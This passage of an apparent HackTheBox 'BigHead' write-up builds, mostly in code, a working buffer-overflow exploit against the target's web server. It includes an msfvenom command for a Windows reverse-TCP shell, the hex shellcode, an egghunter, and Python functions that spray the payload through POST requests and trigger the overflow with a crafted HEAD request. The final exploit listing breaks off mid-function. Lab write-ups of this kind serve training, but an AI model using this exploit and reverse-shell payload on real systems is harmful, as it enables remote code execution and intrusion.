&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/74.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;as-we-can-see-the-whole-request-is-printed-in-the-memory-with-this-information-now-we-can-write-the-exploit&quot;&gt;As we can see the whole request is printed in the memory. With this information now we can write the exploit.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;writing-the-exploit&quot;&gt;Writing the Exploit&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-is-the-imports-i-imported-socketbinascii-and-re&quot;&gt;First thing is the imports, I imported &lt;code class=&quot;highlighter-rouge&quot;&gt;socket&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;binascii&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;re&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import socket
import binascii
import re
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-started-to-define-the-variables--we-need-variables-to-hold-the-host-the-port-the-egg-the-shellcode-and-the-egghunter-lets-generate-the-shellcode-first-&quot;&gt;Then I started to define the variables , we need variables to hold the host, the port, the egg, the shellcode and the egghunter. Let’s generate the shellcode first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -b '\x00' -f python&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;-b-x00-is-for-bad-chars-x00-which-is-a-null-byte-is-always-a-bad-char-because-it-acts-a-string-terminator-and-terminates-the-execution-so-we-dont-need-that-in-the-shellcode--we-will-add-this-to-the-exploit-and-remove-x-because-we-will-use-hexlify-and-unhexlify-functions-from-binascii-this-is-for-the-shellcode-now-we-need-the-egghunter-i-used-this-tool-to-generate-the-egghunter-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-b '\x00'&lt;/code&gt; is for bad chars. &lt;code class=&quot;highlighter-rouge&quot;&gt;\x00&lt;/code&gt; which is a null byte is always a bad char because it acts a string terminator and terminates the execution so we don’t need that in the shellcode.  We will add this to the exploit and remove &lt;code class=&quot;highlighter-rouge&quot;&gt;\x&lt;/code&gt; because we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;hexlify&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;unhexlify&lt;/code&gt; functions from &lt;code class=&quot;highlighter-rouge&quot;&gt;binascii&lt;/code&gt;. This is for the shellcode, now we need the egghunter. I used this &lt;a href=&quot;https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py&quot;&gt;tool&lt;/a&gt; to generate the egghunter :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-i-didnt-like-that-i-should-generate-a-new-one-if-i-wanted-to-change-the-egg-heres-how-the-tool-is-doing-it-&quot;&gt;But I didn’t like that I should generate a new one if I wanted to change the egg, here’s how the tool is doing it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-easily-add-this-to-the-exploit-itself&quot;&gt;We can easily add this to the exploit itself.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;host = '10.10.10.112'
port = 80
egg = 'R1ck'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;host-is-for-the-ip-of-the-machine-port-is-for-the-port-and-egg-is-to-hold-the-value-of-the-egg-after-that-comes-the-buf-variable-generated-by-msfvenom-this-is-the-my-shellcode-you-should-generate-a-new-one-with-your-ip-and-listening-port-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;host&lt;/code&gt; is for the ip of the machine, &lt;code class=&quot;highlighter-rouge&quot;&gt;port&lt;/code&gt; is for the port and &lt;code class=&quot;highlighter-rouge&quot;&gt;egg&lt;/code&gt; is to hold the value of the egg. After that comes the &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; variable generated by &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; (this is the my shellcode you should generate a new one with your ip and listening port) :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;buf =  &quot;&quot;
buf += &quot;d9c7d97424f45a2bc9bb9f0948&quot;
buf += &quot;3bb15283c204315a1303c51aaa&quot;
buf += &quot;ce05f4a831f505cdb81034cddf&quot;
buf += &quot;5167fd94378476f8a31ffad5c4&quot;
buf += &quot;a8b103eb29e9706aaaf0a44c93&quot;
buf += &quot;3ab98dd42730df8d2ce7cfba79&quot;
buf += &quot;3464f06c3c99418e6d0cd9c9ad&quot;
buf += &quot;af0e62e4b7534fbe4ca73b4184&quot;
buf += &quot;f9c4eee93537ee2ef1a8854601&quot;
buf += &quot;549e9d7b822b05db418be1dd86&quot;
buf += &quot;4a62d163182cf672cd4702fef0&quot;
buf += &quot;878244d703ce1f7612aace8744&quot;
buf += &quot;15ae2d0fb8bb5f52d508526c25&quot;
buf += &quot;07e51f17885db71b4178405b78&quot;
buf += &quot;3cdea2833df760d76d6f4058e6&quot;
buf += &quot;6f6d8da93fc17e0aefa12ee2e5&quot;
buf += &quot;2d101206e439b9fd6f4c34ee74&quot;
buf += &quot;384a108e81c3f6fae185a19298&quot;
buf += &quot;8f3902641a4404eea9b9cb07c7&quot;
buf += &quot;a9bce792936bf708bbf06ad73b&quot;
buf += &quot;7e97406cd76999f8c5d0331e14&quot;
buf += &quot;847c9ac375822381c2a0335fca&quot;
buf += &quot;ec670f9dbad1e9770d8ba324c7&quot;
buf += &quot;5b3507d81d3a42aec18b3bf7fe&quot;
buf += &quot;24acff87584cff52d97c4afe48&quot;
buf += &quot;15136bc978a4460e852762ef72&quot;
buf += &quot;3707ea3ffff486506afa3550bf&quot;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-created-a-variable-to-hold-the-final-shellcode-egg-doubled--shellcode-and-another-variable-for-the-egghunter-&quot;&gt;I created a variable to hold the final shellcode (egg doubled + shellcode) and another variable for the egghunter :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shellcode = (egg * 2) + binascii.unhexlify(buf)
egghunter = &quot;6681caff0f42526a0258cd2e3c055a74efb8&quot; + binascii.hexlify(egg) + &quot;8bfaaf75eaaf75e7ffe7&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--theres-a-variable-called-n-that-will-come-later-and-it-has-nothing-to-do-with-the-exploit-itself&quot;&gt;Note : there’s a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;, that will come later and it has nothing to do with the exploit itself.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-need-to-create-two-functions-first-one-is-to-send-the-shellcode-through-a-post-request-the-other-one-is-to-exploit-the-vulnerability-and-send-the-egghunter&quot;&gt;Now we need to create two functions. First one is to send the shellcode through a POST request, The other one is to exploit the vulnerability and send the egghunter.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-start-by-defining-the-function-&quot;&gt;We will start by defining the function :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;def send_shellcode(N,host,port,egg,shellcode):&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-open-a-tcp-stream-socket-to-the-server-and-the-port-and-hold-it-in-a-variable-called-s-&quot;&gt;Then we will open a TCP stream socket to the server and the port and hold it in a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;last-thing-to-do-is-to-send-the-post-request-with-the-shellcode-&quot;&gt;Last thing to do is to send the POST request with the shellcode :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s.send(&quot;POST / HTTP/1.1\r\n&quot;)
s.send(&quot;Host: dev.bighead.htb\r\n&quot;)
s.send(&quot;Content-Length: %s\r\n&quot;%len(shellcode))
s.send(&quot;\r\n&quot;)
s.send(shellcode+&quot;\r\n&quot;)
s.send(&quot;\r\n&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-we-will-close-the-stream-&quot;&gt;Then we will close the stream :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s.close()&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-added-this-in-a-for-loop-to-send-the-shellcode-16-times-i-did-this-because-i-wanted-to-put-the-shellcode-in-different-places-so-the-egghunter-finds-it-easily-i-also-added-a-print-statement-at-the-start-of-the-function--print-03332m--sending-shellcode-03332m-is-for-the-color-its-not-important-for-the-exploit-and-i-added-a-print-statement-before-closing-the-stream--print-03334m----strn-----resubrs-srecv12-resubrs-srecv12-this-will-use-re-regular-expressions-operations-to-print-the-first-12-chars-of-the-first-line-of-the-server-response-http11-----status-code-3-chars--12&quot;&gt;I added this in a &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt; loop to send the shellcode 16 times. I did this because I wanted to put the shellcode in different places so the egghunter finds it easily. I also added a print statement at the start of the function : &lt;code class=&quot;highlighter-rouge&quot;&gt;print &quot;\033[32m [*] Sending Shellcode&quot;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;\033[32m&lt;/code&gt; is for the color it’s not important for the exploit. And I added a print statement before closing the stream : &lt;code class=&quot;highlighter-rouge&quot;&gt;print '\033[34m' + '[' + str(N) + '] ' + re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))&lt;/code&gt; This will use &lt;code class=&quot;highlighter-rouge&quot;&gt;re&lt;/code&gt; (regular expressions operations) to print the first 12 chars of the first line of the server response (“HTTP/1.1” + “ “ + status code (3 chars) = 12).&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;send_shellcode&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def send_shellcode(N,host,port,egg,shellcode):
	print &quot;\033[32m [*] Sending Shellcode&quot;
	for i in range(0,16):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
		s.connect((host,port))
		s.send(&quot;POST / HTTP/1.1\r\n&quot;)
		s.send(&quot;Host: dev.bighead.htb\r\n&quot;)
		s.send(&quot;Content-Length: %s\r\n&quot;%len(shellcode))
		s.send(&quot;\r\n&quot;)
		s.send(shellcode+&quot;\r\n&quot;)
		s.send(&quot;\r\n&quot;)
		print '\033[34m' + '[' + str(N) + '] ' + re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))
		s.close()
		N += 1
	print &quot;\033[32m [*] Done&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-for-send_shellcode-lets-write-send_egghunter-we-will-define-the-function-first-&quot;&gt;That’s for &lt;code class=&quot;highlighter-rouge&quot;&gt;send_shellcode&lt;/code&gt;, let’s write &lt;code class=&quot;highlighter-rouge&quot;&gt;send_egghunter&lt;/code&gt;. We will define the function first :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;def send_egghunter(host,port,egghunter):&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-open-a-tcp-stream-socket-to-the-server-and-the-port-and-hold-it-in-a-variable-called-s--1&quot;&gt;Then we will open a TCP stream socket to the server and the port and hold it in a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-connect-and-send-the-head-request-&quot;&gt;Then we will connect and send the HEAD request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s.connect((host,port))
s.settimeout(None)
s.send(&quot;HEAD /&quot; + (&quot;A&quot;*72) + &quot;f0125062&quot; + egghunter + &quot; HTTP/1.1\r\n&quot;)
s.send(&quot;Host: dev.bighead.htb\r\n&quot;)
s.send(&quot;\r\n&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-did-settimeoutnone-as-the-server-takes-a-lot-of-time-to-respond-to-this-request-because-we-will-change-the-code-flow-so-the-server-wont-reply-and-we-dont-want-the-stream-to-be-closed-before-our-egghunter-is-successfully-executed&quot;&gt;I did &lt;code class=&quot;highlighter-rouge&quot;&gt;settimeout(None)&lt;/code&gt; as the server takes a lot of time to respond to this request (Because we will change the code flow so the server won’t reply) and we don’t want the stream to be closed before our egghunter is successfully executed.&lt;/h4&gt;
&lt;h4 id=&quot;ssendhead---a72--f0125062--egghunter---http11rn-this-line-sends-72-as-then-f0125062-jmp-esp-new-eip-then-the-egghunter&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s.send(&quot;HEAD /&quot; + (&quot;A&quot;*72) + &quot;f0125062&quot; + egghunter + &quot; HTTP/1.1\r\n&quot;)&lt;/code&gt; This line sends 72 A’s then &lt;code class=&quot;highlighter-rouge&quot;&gt;f0125062&lt;/code&gt; (jmp esp (new EIP)) then the egghunter.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;send_egghunter&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def send_egghunter(host,port,egghunter):
	print &quot;\033[32m [*] Sending EggHunter&quot;
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	s.connect((host,port))
	s.settimeout(None)
	s.send(&quot;HEAD /&quot; + (&quot;A&quot;*72) + &quot;f0125062&quot; + egghunter + &quot; HTTP/1.1\r\n&quot;)
	s.send(&quot;Host: dev.bighead.htb\r\n&quot;)
	s.send(&quot;\r\n&quot;)
	print '\033[34m' + re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))
	s.close()
	print &quot;\033[32m [*] Done&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/81.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-exploit-is-ready-we-just-need-to-call-the-functions-&quot;&gt;The exploit is ready, we just need to call the functions :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;send_shellcode(N,host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/82.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;final-exploit-&quot;&gt;Final Exploit :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'10.10.10.112'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'R1ck'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;d9c7d97424f45a2bc9bb9f0948&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3bb15283c204315a1303c51aaa&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ce05f4a831f505cdb81034cddf&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;5167fd94378476f8a31ffad5c4&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a8b103eb29e9706aaaf0a44c93&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3ab98dd42730df8d2ce7cfba79&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3464f06c3c99418e6d0cd9c9ad&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;af0e62e4b7534fbe4ca73b4184&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;f9c4eee93537ee2ef1a8854601&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;549e9d7b822b05db418be1dd86&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;4a62d163182cf672cd4702fef0&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;878244d703ce1f7612aace8744&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;15ae2d0fb8bb5f52d508526c25&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;07e51f17885db71b4178405b78&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3cdea2833df760d76d6f4058e6&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;6f6d8da93fc17e0aefa12ee2e5&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;2d101206e439b9fd6f4c34ee74&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;384a108e81c3f6fae185a19298&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;8f3902641a4404eea9b9cb07c7&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a9bce792936bf708bbf06ad73b&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;7e97406cd76999f8c5d0331e14&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;847c9ac375822381c2a0335fca&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ec670f9dbad1e9770d8ba324c7&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;5b3507d81d3a42aec18b3bf7fe&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;24acff87584cff52d97c4afe48&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;15136bc978a4460e852762ef72&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3707ea3ffff486506afa3550bf&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;6681caff0f42526a0258cd2e3c055a74efb8&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;8bfaaf75eaaf75e7ffe7&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m [*] Sending Shellcode&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
